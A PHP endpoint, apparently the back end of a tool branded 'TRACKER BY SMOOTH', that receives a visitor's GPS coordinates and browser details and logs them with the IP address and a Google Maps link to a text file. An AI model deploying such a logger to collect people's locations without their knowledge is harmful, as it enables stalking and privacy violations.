<?php

header("Content-Type: application/json; charset=UTF-8");

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    http_response_code(405);
    echo json_encode(["success" => false, "message" => "POST requests only."]);
    exit;
}

$data = json_decode(file_get_contents("php://input"), true);

if (
    !is_array($data) ||
    !isset($data["latitude"], $data["longitude"], $data["accuracy"])
) {
    http_response_code(400);
    echo json_encode(["success" => false, "message" => "Required location data is missing."]);
    exit;
}

$lat = filter_var($data["latitude"], FILTER_VALIDATE_FLOAT);
$lon = filter_var($data["longitude"], FILTER_VALIDATE_FLOAT);
$accuracy = filter_var($data["accuracy"], FILTER_VALIDATE_FLOAT);

if (
    $lat === false ||
    $lon === false ||
    $accuracy === false ||
    $lat < -90 || $lat > 90 ||
    $lon < -180 || $lon > 180 ||
    $accuracy < 0
) {
    http_response_code(400);
    echo json_encode(["success" => false, "message" => "Invalid coordinate values."]);
    exit;
}

$ip = $_SERVER["REMOTE_ADDR"] ?? "Unavailable";
$browser = substr((string)($data["browser"] ?? "Unavailable"), 0, 1000);
$time = date("Y-m-d H:i:s");
$map = "https://www.google.com/maps?q=" . urlencode("$lat,$lon");

$entry = "\n";
$entry .= "========================================\n";
$entry .= "           TRACKER BY SMOOTH            \n";
$entry .= "========================================\n";
$entry .= "Time       : $time\n";
$entry .= "IP Address : $ip\n";
$entry .= "Latitude   : $lat\n";
$entry .= "Longitude  : $lon\n";
$entry .= "Accuracy   : $accuracy metres\n";
$entry .= "Browser    : $browser\n";
$entry .= "Google Map : $map\n";
$entry .= "========================================\n";

$file = __DIR__ . DIRECTORY_SEPARATOR . "location.txt";

if (file_put_contents($file, $entry, FILE_APPEND | LOCK_EX) === false) {
    http_response_code(500);
    echo json_encode(["success" => false, "message" => "Could not save location.txt."]);
    exit;
}

error_log($entry);

echo json_encode([
    "success" => true,
    "map" => $map
]);

?>
